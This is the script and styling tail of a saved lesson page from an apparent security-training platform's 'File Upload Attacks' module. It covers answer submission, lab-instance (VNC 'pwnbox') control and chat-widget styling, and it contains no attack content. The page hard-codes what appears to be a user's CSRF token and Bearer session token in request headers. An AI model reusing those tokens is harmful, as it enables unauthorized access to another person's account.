<script src="./File Upload Attacks2_files/jquery.min.js.download"></script>
<script src="./File Upload Attacks2_files/bootstrap.bundle.min.js.download"></script>
<script src="./File Upload Attacks2_files/metisMenu.min.js.download"></script>
<script src="./File Upload Attacks2_files/simplebar.min.js.download"></script>
<script src="./File Upload Attacks2_files/waves.min.js.download"></script>
<script src="./File Upload Attacks2_files/toastr.min.js.download"></script>
<script src="./File Upload Attacks2_files/axios.min.js.download"></script>
<script src="./File Upload Attacks2_files/prism.js.download"></script>
<script src="./File Upload Attacks2_files/main.js.download"></script>
<script>
    axios.defaults.headers.common = {
        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
        'X-Requested-With': 'XMLHttpRequest',
        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
    };
</script>
<script>
    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');

    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');

    $( ".favouriteBtn" ).click(function() {
        let id = $(this).data('module-id');

        axios.get('/api/modules/favourite/'+id).then(response => {
            let data = response.data;
            if (data.fav === 1) {
                $(this).removeClass('far fa').addClass('fa');
                toastr["success"](data.message, "Success");
            } else {
                $(this).removeClass('far fa').addClass('far');
                toastr["success"](data.message, "Success");
            }
        });
    });

    function encode_utf8(string) {
    return unescape(encodeURIComponent(string));
  }

  $('.btnAnswer').click(function() {
    let question_id = $(this).data('question-id');
    $(this).attr('disabled', 1);
    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
    axios.post('/api/check/answer', {
      answer: btoa(utf8EncodedString),
      question_id: question_id
    }).then(response => {
      $(this).removeAttr('disabled');
      let data = response.data;
      if (data.success === 0) {
        toastr['error'](data.message, 'Error');
      } else {
        $(this).attr('disabled', 1);
        $('#answer' + question_id).attr('disabled', 1);
        $('#answer' + question_id).addClass('text-success');
        $('#hintBtn' + question_id).attr('disabled', 1);
        toastr['success'](data.message, 'Success');
        completeCheck();
      }
    });
  });

  $('.btnAnswerExercise').click(function() {
    let exercise_id = $(this).data('exercise-id');
    $(this).attr('disabled', 1);
    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
      answer: btoa(utf8EncodedString)
    }).then(response => {
      $(this).removeAttr('disabled');
      let data = response.data;
      if (data.success === 0) {
        toastr['error'](data.message, 'Error');
      } else {
        $(this).attr('disabled', 1);
        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
        toastr['success'](data.message, 'Success');
      }
    });
  });

    
    $('.reveal-modal').click(e => {
        let id = $(e.target).data('exercise-id');
        $(`#revealExerciseAnswer${id}`).modal('hide');
    });

    $( document ).ready(function() {

        $('pre').filter(function () {
            return this.className.match(/\blanguage-/);
        }).each(function () {
            let heading = $(this).prevAll().closest('h4').last().text();

            if (this.className === ' language-shell-session') {
                wrapTerminal(this, heading);
            } else if (this.className === ' language-powershell-session') {
                wrapPSTerminal(this, heading);
            } else if (this.className === ' language-cmd-session') {
                wrapCMDTerminal(this, heading);
            } else if (this.className.startsWith(' language-')) {
                var language = this.className.split('-').pop();
                wrapCodeBlock(this,language);
            }
        });

        wrapBrowser($('.website-screenshot'));
        completeCheck();

        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
    });

    function completeCheck()
    {
        axios.get('/api/check/complete/1260').then(response => {
            let data = response.data;
            if (data.success === 1) {
                if (data.completed === true) {
                    $('#completeBtn').show();
                }
            }
        });
    }

    function wrapTerminal(element, heading)
    {
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapPSTerminal(element, heading)
    {
        $(element).css('background', '#012456').children().css('color','white');
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapCMDTerminal(element, heading)
    {
        $(element).css('background', 'black').children().css('color','white');
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapCodeBlock(element,lang)
    {
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
    }
    function wrapBrowserOld(element)
    {
        $(element).css("border", "0px").css("border-radius","0");
        let url = element.data('url');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <input type="text" class="website-screenshot-url" disabled value="${url}">
                    <span class="float-right"><i class="fa fa-home"></i></span>
                </div>
            `);
    }
    function wrapBrowser(element)
    {
        $(element).css("border", "0px").css("border-radius","0");

        $(element).each( function(index,e) {
            let url = $(e).data('url');
            $(e).wrap('<div class="window_content"></div>')
                .parent().wrap('<div class="window_container"></div>')
                .prepend(`
                    <div class="window_top">
                        <span class="mr-2">
                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
                        </span>
                        <input type="text" class="website-screenshot-url" disabled value="${url}">
                        <span class="float-right"><i class="fa fa-bars"></i></span>
                    </div>
                `);
        })
    }
</script>
<script type="module">
    import RFB from '/assets/libs/vnc/core/rfb.js';

    let rfb;
    let sidePreview;
    let desktopName;
    let pwnboxActive = false;

    function connectedToServer(e) {
        status("Connected to " + desktopName);
        $('.fullScreenBtn').show();
        $('.resetInstanceBtn').show();
        $('.terminateInstanceBtn').show();
        $('.extendInstanceBtn').show();
        $('.instanceLoading').hide();
        $('.instanceStart').hide();
        $('.resetInstanceBtn').prop('disabled',false);
        $('.fullScreenBtn').prop('disabled',false);
        $('.extendInstanceBtn').prop('disabled',false);
        $('.terminateInstanceBtn').prop('disabled',false);

        document.querySelector('canvas').addEventListener('focus', (event) => {
            navigator.clipboard.readText()
                .then(text => {
                    writeToClipboard(text);
                })
                .catch(err => {
                    console.log('Something went wrong while accessing clipboard', err);
                })
        });

    }

    function disconnectedFromServer(e) {
        status("Disconnected");
        $('.screenPlaceholder').show();
        stopCountdown();
    }

    function clipboardReceived(e) {
        navigator.clipboard.writeText(e.detail.text)
            .then(() => {
                // Success!
            })
            .catch(err => {
                console.log('Something went wrong while copying to clipboard.', err);
            });
    }

    function updateDesktopName(e) {
        desktopName = e.detail.name;
    }

    function status(text) {
        console.log(text);
        $("#statusText").html(text);
    }

    function readQueryVariable(name) {
        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
            match = document.location.href.match(re);

        if (match) {
            return decodeURIComponent(match[1]);
        }

        return null;
    }

    function writeToClipboard(text) {
        rfb.clipboardPasteFrom(text);
    }

    let host = '';
    let password = '';
    let countdown = '';
    let targetCountdown = '';
    let url= '';
    let spawnInterval = null;

    function getPwnbox() {
        axios.get('/api/get/pwnbox').then(response => {
            let data = response.data;

            if (spawnInterval !== null && data.instance.action_log !== null) {
                let error = data.instance.action_log.find(log => log.error === true);
                if (error) {
                    $('.resetInstanceBtn').prop('disabled',false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                    $('.instanceStart').show();
                    $('.instanceLoading').hide();
                    $('.startInstanceBtn').show();

                    clearInterval(spawnInterval);
                    disconnectedFromServer();

                    let errorMessage = `${error.text}. Please contact support.`;
                    toastr["error"](errorMessage, "Error");

                    status(errorMessage);
                    return;
                }
            }

            if (data.success === 1 && data.instance.vnc_password !== null) {
                if (data.instance.action_log.find(log => log.action === 'ready')) {
                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
                    password = data.instance.vnc_password;
                    $('.lifeLeft').html(data.instance.life_remaining);
                    startCountdown();
                    $('.screenPlaceholder').hide();
                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
                    pwnboxActive = true;
                    connect();

                    if (spawnInterval !== null) {
                        clearInterval(spawnInterval);
                    }
                }
            } else {
                $('.screenPlaceholder').show();
            }

        });
    }

        function extendPwnbox() {
        axios.get('/api/extend/pwnbox').then(response => {
            let data = response.data;
            if (data.success === 1) {
                $('.lifeLeft').html(data.instance.life_remaining);
                stopCountdown();
                startCountdown();
                toastr["success"]("Time extended for 60 minutes.", "Success");
            } else {
                toastr["error"](data.message, "Error");
            }

        });
    }
    
    getPwnbox();

    function startCountdown() {
        countdown = setInterval(function() {
            let life = parseInt($('.lifeLeft').html()) -1;
            $('.lifeLeft').html(life)
        }, 60 * 1000);
    }

    function stopCountdown() {
        clearInterval(countdown);
    }

    function terminatePwnbox() {
        $('.resetInstanceBtn').prop('disabled',true);
        $('.terminateInstanceBtn').prop('disabled',true);
        $('.fullScreenBtn').prop('disabled',true);
        $('.extendInstanceBtn').prop('disabled',true);
        $('.instanceStart').hide();

        $('.instanceTerminating').show();

        status('Terminating Interactive Instance...');

        axios.delete('/api/terminate/pwnbox')
            .then(({ data }) => {
                if (data.success === 1) {
                    $('.startInstanceBtn').show();
                    $('.instanceStart').show();
                    $('.instanceTerminating').hide();
                    $('.resetInstanceBtn').hide();
                    $('.terminateInstanceBtn').hide();
                    $('.fullScreenBtn').hide();
                    $('.extendInstanceBtn').hide();

                    pwnboxActive = false;

                    toastr['success']('Instance has been terminated.', 'Success');
                } else {
                    toastr['error'](data.message, 'Error');
                    connect();
                    $('.resetInstanceBtn').prop("disabled", false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                }
            });
    }

    function startPwnbox() {
        $('.resetInstanceBtn').prop('disabled',true);
        $('.fullScreenBtn').prop('disabled',true);
        $('.extendInstanceBtn').prop('disabled',true);
        $('.terminateInstanceBtn').prop('disabled',true);
        $('.instanceStart').hide();
        $('.instanceLoading').show();
        $('.startInstanceBtn').hide();

        status("Starting Interactive Instance...");

        grecaptcha.ready(function() {
            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
                if (token) {
                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
                        let data = response.data;
                        if (data.success === 1) {
                            spawnInterval = setInterval(() => {
                                getPwnbox();
                            }, 2000);
                        } else {
                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
                                $('.resetInstanceBtn').prop("disabled", false);
                                $('.fullScreenBtn').prop('disabled',false);
                                $('.extendInstanceBtn').prop('disabled',false);
                                $('.terminateInstanceBtn').prop('disabled',false);
                                connect();

                                if (data.code === 3) {
                                    $('.instanceLoading').hide();
                                    startCountdown();
                                }
                            } else {
                                $('.startInstanceBtn').show();
                                $('.instanceStart').show();
                                $('.instanceLoading').hide();
                            }

                            toastr["error"](data.message, "Error");
                        }

                    });
                } else {
                    $('.resetInstanceBtn').prop('disabled',false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                    $('.instanceStart').show();
                    $('.instanceLoading').hide();
                    $('.startInstanceBtn').show();
                }
            });
        });
    }

    $('.fullScreenBtn').click(function() {
        window.open(url, "_blank");
    });

    $('.startInstanceBtn').click(function() {
        startPwnbox();
                spawnTarget();
            });

    $('.resetInstanceBtn').click(function() {
        $('.screenPlaceholder').show();
        $('.instanceStart').show();
                rfb.disconnect();
                sidePreview.disconnect();
        startPwnbox();
    });

    $('.terminateInstanceBtn').click(function() {
        $('.screenPlaceholder').show();
        $('.instanceStart').show();
                rfb.disconnect();
                sidePreview.disconnect();
        terminatePwnbox();
    });

    $('.extendInstanceBtnClicker').click(function() {
       extendPwnbox();
    });

    $('.resetTargetBtn').click(function(){
        $(this).prop('disabled',true);
                    spawnDocker();
                    });

    function connect() {
        status("Connecting to " + host.split('/')[2] + "...");

                rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
            { credentials: { password: password } });
        //Listeners
        rfb.addEventListener("desktopname", updateDesktopName);
        rfb.addEventListener("clipboard",clipboardReceived);

        rfb.resizeSession = true;
        rfb.viewOnly = false;
        
        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
            { credentials: { password: password } });

        sidePreview.addEventListener("connect",  connectedToServer);
        sidePreview.addEventListener("disconnect", disconnectedFromServer);

        sidePreview.resizeSession = false;
        sidePreview.viewOnly = true;
        sidePreview.scaleViewport = true;
    }

    $('.target, .targetIp').click(e => {
        if ($('.resetTargetBtn').is(':hidden')) return;
        navigator.clipboard.writeText($(e.target).html())
            .then(() => {
                toastr['success']('Target copied to clipboard', 'Success');
            })
            .catch(err => {
                console.log('Something went wrong while copying to clipboard.', err);
            });
    });

        $('.spawnTargetBtn').click(function() {
        spawnDocker();
    })

    function spawnDocker() {
        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
        axios.get('/api/spawn/container/1260').then(response => {
            let data = response.data;
            if (data.success === 1) {
                $('.target').html(data.instance.hostname+":"+data.instance.port);
                $('.targetIp').html(data.instance.hostname);
                $('.resetTargetBtn').show();
                $('.resetTargetBtn').prop('disabled',false);
                $('.targetLifeTimeContainer').show();
                $('.targetLifeTime').html(90);
                startTargetCountdown();
            } else {
                toastr["error"]("Target failed to spawn. Please try refreshing the page.", "Error");
                $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target failed to spawn :(');
                $('.resetTargetBtn').prop('disabled',false);
            }
        });
    }
        
    function startTargetCountdown() {
        targetCountdown = setInterval(function() {
            let life = parseInt($('.targetLifeTime').html()) -1;
            $('.targetLifeTime').html(life)
            if (life == 0) {
                $('.targetLifeTimeContainer').hide();
            }
        }, 60 * 1000);
    }
</script>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe frameborder="0" height="60" name="a-bo2yx3i0c7on" role="presentation" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" scrolling="no" src="./File Upload Attacks2_files/anchor.html" title="reCAPTCHA" width="256"></iframe></div><div class="grecaptcha-error"></div><textarea class="g-recaptcha-response" id="g-recaptcha-response-100000" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe src="./File Upload Attacks2_files/saved_resource.html" style="display: none;"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><iframe aria-hidden="true" id="intercom-frame" src="./File Upload Attacks2_files/saved_resource(1).html" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" tabindex="-1" title="Intercom"></iframe><div class="intercom-lightweight-app"><div aria-label="Open Intercom Messenger" aria-live="polite" class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg viewbox="0 0 28 32" xmlns="http://www.w3.org/2000/svg"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewbox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z" fill-rule="evenodd"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    from {
      opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #85C700;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    animation: intercom-lightweight-app-launcher 250ms ease;
  }

  .intercom-lightweight-app-launcher:focus {
    outline: none;
    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 60px;
    height: 60px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 28px;
    height: 32px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 56px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 36px;
    max-width: 36px;
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg {
    width: 16px;
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms ease-out;
    
        width: 376px;
        height: calc(100% - 120px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 100px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
        border-radius: 8px;
      
  }

  .intercom-lightweight-app-messenger-header {
    height: 75px;
    background: linear-gradient(
      135deg,
      rgb(17, 25, 39) 0%,
      rgb(0, 0, 0) 100%
    );
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div><img height="1" src="./File Upload Attacks2_files/adsct" style="display: none;" width="1"/><img height="1" src="./File Upload Attacks2_files/adsct(1)" style="display: none;" width="1"/></body></html>